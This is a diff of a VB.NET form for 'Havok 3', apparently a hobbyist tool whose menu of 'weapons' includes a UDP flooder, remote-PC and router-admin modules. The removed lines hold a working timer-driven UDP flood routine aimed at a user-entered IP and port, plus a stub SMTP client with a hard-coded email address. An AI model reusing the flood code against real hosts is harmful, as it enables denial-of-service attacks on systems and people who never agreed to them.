@@ -1,8 +1,9 @@
 ﻿Imports System.Net.Sockets
 Imports System.Diagnostics
-Imports System.Text
 Imports System.Net
+Imports System.Text
 Imports System.IO
+'mabye gonna make a mail sender on a timer, will see what i can code up :P (P.S reason for importing Mail functions)
 Imports System.Net.Mail
 Public Class Form1
 
@@ -10,30 +11,12 @@ Public Class Form1
         Updates.Show()
     End Sub
 
-    Private Sub RemotePCStart()
-
-    End Sub
-
-    Private Sub RemotePCStop()
-
-    End Sub
-
-
-    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
+    Private Sub WeaponStarter()
         If ComboBox1.Text = "UDP-Flooder" Then
             ComboBox1.Enabled = "False"
             ListBox1.Items.Add("---------------------------")
             ListBox1.Items.Add("Starting UDP-Flooder...")
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("UDP-Flooder Has Started!")
-
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("Starting Attack On " & TextBox1.Text & " At Port " & TextBox3.Text)
-            ListBox1.Items.Add("With " & TextBox2.Text & " Bytes of Data")
-            UDPFlooder.Start()
-            PictureBox2.Show()
-            Label9.Visible = "True"
-            Label9.Text = "Flooding With UDP..."
+            UDPFlooder.Show()
             Button2.Enabled = False
             Button4.Enabled = True
         End If
@@ -46,7 +29,7 @@ Public Class Form1
             ListBox1.Items.Add("---------------------------")
             ListBox1.Items.Add("Starting Remote-PC...")
             RemotePC.Show()
-           
+
             PictureBox2.Show()
             Label9.Visible = "True"
             Button2.Enabled = False
@@ -66,7 +49,7 @@ Public Class Form1
             Button4.Enabled = "True"
             PictureBox2.Show()
             Label9.Visible = "True"
-          
+
             Shell("js.exe")
             ListBox1.Items.Add("---------------------------")
             ListBox1.Items.Add("JS-Console Has Started!")
@@ -123,7 +106,7 @@ Public Class Form1
 
 
         If ComboBox1.Text = "HPusher" Then
-        
+
             ListBox1.Items.Add("---------------------------")
             ListBox1.Items.Add("Starting HPusher...")
             HPusher.Show()
@@ -132,6 +115,20 @@ Public Class Form1
 
 
         End If
+
+
+        If ComboBox1.Text = "RouterAdmin" Then
+
+            ListBox1.Items.Add("---------------------------")
+            ListBox1.Items.Add("Starting RouterAdmin...")
+            RouterAdmin.Show()
+            Button2.Enabled = False
+            Button4.Enabled = True
+
+
+        End If
+
+
 
 
 
@@ -210,26 +207,11 @@ Public Class Form1
         If ComboBox1.Text = "" Then
             MsgBox("Please Select A Weapon/Tool")
         End If
-
     End Sub
 
-    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
+    Private Sub WeaponStopper()
         If ComboBox1.Text = "UDP-Flooder" Then
-            ComboBox1.Enabled = "True"
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("Stoping Attack On " & TextBox1.Text & " At Port " & TextBox3.Text)
-            ListBox1.Items.Add("With " & TextBox2.Text & " Bytes of Data")
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("Stoping UDP-Flooder...")
-            UDPFlooder.Stop()
-            PictureBox2.Hide()
-            Label9.Visible = "False"
-
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("UDP-Flooder Has Stopped!")
-            Button4.Enabled = False
-            Button2.Enabled = True
-
+            UDPFlooder.Close()
         End If
 
         If ComboBox1.Text = "Remote-PC" Then
@@ -258,6 +240,14 @@ Public Class Form1
 
     End Sub
 
+    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
+        WeaponStarter()
+    End Sub
+
+    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
+        WeaponStopper()
+    End Sub
+
     Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
         WebBrowser1.GoBack()
     End Sub
@@ -280,24 +270,6 @@ Public Class Form1
 
     Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
         WebBrowser1.Stop()
-    End Sub
-
-    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UDPFlooder.Tick
-        ' Text To Appear On Log Goes Below
-
-        ListBox1.Items.Add("Attacking " & TextBox1.Text & " At Port " & TextBox3.Text)
-        ListBox1.Items.Add("With " & TextBox2.Text & " Bytes of Data")
-
-        ' UDP Flooder Code Goes Below, Thanks 0nix
-
-        Dim udpClient As New UdpClient
-        Dim GLOIP As IPAddress
-        Dim bytCommand As Byte() = New Byte() {}
-        GLOIP = IPAddress.Parse(TextBox1.Text)
-        udpClient.Connect(GLOIP, TextBox3.Text)
-        bytCommand = Encoding.ASCII.GetBytes(TextBox2.Text)
-        udpClient.Send(bytCommand, bytCommand.Length)
-        UDPFlooderStatsBox.LabelX2.Text = "Data Received: " & udpClient.Available.ToString
     End Sub
 
     Private Sub Button12_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
@@ -484,16 +456,10 @@ Public Class Form1
         Preferences.WebBrowser1.Navigate("http://www.gnu.org/licenses/gpl.txt")
         Preferences.WebBrowser2.Navigate("http://deavmi.3owl.com/index.php/User_talk:Deavmi")
         WebBrowser1StatusText.Start()
-
-
         NetMonTimer.Start()
-
         Label6.Text = "v" & My.Application.Info.Version.ToString
-        MsgBox("Havok 3 Is Beta, HGetter's and HPusher's Background Workers a.k.a The Downloader and Uploader (Respectively) Their Processes, Cannot Be Canceled, To End Them You Need To Exit Havok or Restart Havok, This Can Be Done From The Settings Tab In The About Window. Thanks. ~Deavmi")
-
-        'Just A Lil' Joke           
-        If File.Exists("cheslyn") = True Then
-            MsgBox("Where Is Cheslyn?")
+        If My.Settings.Havok_Environment_DevMessage = "true" Then
+            MsgBox("Havok 3 Is Beta, HGetter's and HPusher's Background Workers a.k.a The Downloader and Uploader (Respectively) Their Processes, Cannot Be Canceled, To End Them You Need To Exit Havok or Restart Havok, This Can Be Done From The Settings Tab In The About Window. Thanks. ~Deavmi")
         End If
     End Sub
 
@@ -502,18 +468,7 @@ Public Class Form1
         ListBox1.Items.Clear()
         WebBrowser1.Navigate(My.Settings.Havok_Browser_HomepageURL.ToString)
         If ComboBox1.Text = "UDP-Flooder" Then
-            ComboBox1.Enabled = "True"
-            ListBox1.Items.Add("---------------------------")
-            ListBox1.Items.Add("Stoping Attack On " & TextBox1.Text & " At Port " & TextBox3.Text)
-            ListBox1.Items.Add("With " & TextBox2.Text & " Bytes of Data")
-            UDPFlooder.Stop()
-            PictureBox2.Hide()
-            Label9.Visible = "False"
-            TextBox1.Enabled = "True"
-            TextBox2.Enabled = "True"
-            TextBox3.Enabled = "True"
-            Button2.Enabled = "True"
-            Button4.Enabled = "False"
+            UDPFlooder.Close()
             WebBrowser1.Navigate(My.Settings.Havok_Browser_HomepageURL.ToString)
         End If
         If ComboBox1.Text = "HGetter" Then
@@ -540,6 +495,11 @@ Public Class Form1
             ViewSource.Close()
             WebBrowser1.Navigate(My.Settings.Havok_Browser_HomepageURL.ToString)
         End If
+        If ComboBox1.Text = "RouterAdmin" Then
+            RouterAdmin.Close()
+            WebBrowser1.Navigate(My.Settings.Havok_Browser_HomepageURL.ToString)
+        End If
+
     End Sub
 
     Private Sub Button13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button13.Click
@@ -831,25 +791,40 @@ Public Class Form1
             End If
         End If
 
-
-
-
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-        'STOP MULTITASKING CODE HERE
-
+        If ComboBox1.Text = "RouterAdmin" Then
+            If RouterAdmin.Visible = True Then
+                Button2.Enabled = False
+                Button4.Enabled = True
+            Else
+                Button2.Enabled = True
+                Button4.Enabled = False
+            End If
+        End If
 
         If ComboBox1.Text = "UDP-Flooder" Then
-            UDPFlooderStatsBox.Show()
-        Else
-            UDPFlooderStatsBox.Close()
+            If UDPFlooder.Visible = True Then
+                Button2.Enabled = False
+                Button4.Enabled = True
+            Else
+                Button2.Enabled = True
+                Button4.Enabled = False
+            End If
         End If
-        My.Settings.Havok_Environment_LastTyped_LastSelectedWeapon = ComboBox1.Text.ToString
-        My.Settings.Save()
+
+
+
+
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        'STOP MULTITASKING CODE HERE
+        If My.Settings.Havok_Environment_RememberLastTyped = "true" Then
+            My.Settings.Havok_Environment_LastTyped_LastSelectedWeapon = ComboBox1.Text.ToString
+            My.Settings.Save()
+        End If
     End Sub
 
     Private Sub NetStatusToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NetStatusToolStripMenuItem.Click
@@ -948,15 +923,6 @@ Public Class Form1
         Debugger.Break()
     End Sub
 
-    Private Sub Timer1_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
-        Dim mailmachine As New Mail.SmtpClient
-        mailmachine = New Mail.SmtpClient("", "")
-        mailmachine.Host = ("stmp.googlemail.com")
-        mailmachine.Port = ("")
-        mailmachine.Credentials = "tristankildaire@gmail.com"
-
-    End Sub
-
     Private Sub VisitDeavmisSIteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VisitDeavmisSIteToolStripMenuItem.Click
         Process.Start("http://deavmi.github.io/Deavmi")
     End Sub
@@ -970,7 +936,26 @@ Public Class Form1
     End Sub
 
     Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
-        RouterLogin.Show()
+        UDPFlooder.Show()
+    End Sub
+
+    Private Sub ExternelInstanceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExternelInstanceToolStripMenuItem.Click
+        Shell("Havok.exe")
+    End Sub
+
+    Private Sub OnSameInstanceToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OnSameInstanceToolStripMenuItem.Click
+        Dim newsession As Form1 = New Form1
+        newsession.Show()
+    End Sub
+
+    Private Sub NewSessionToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NewSessionToolStripMenuItem.Click
+        If My.Settings.Havok_Environment_StartNewSessionsOnSameInstance = "true" Then
+            Dim newsession As Form1 = New Form1
+            newsession.Show()
+        End If
+        If My.Settings.Havok_Environment_StartNewSessionsOnSameInstance = "false" Then
+            Shell("Havok.exe")
+        End If
     End Sub
 End Class
 
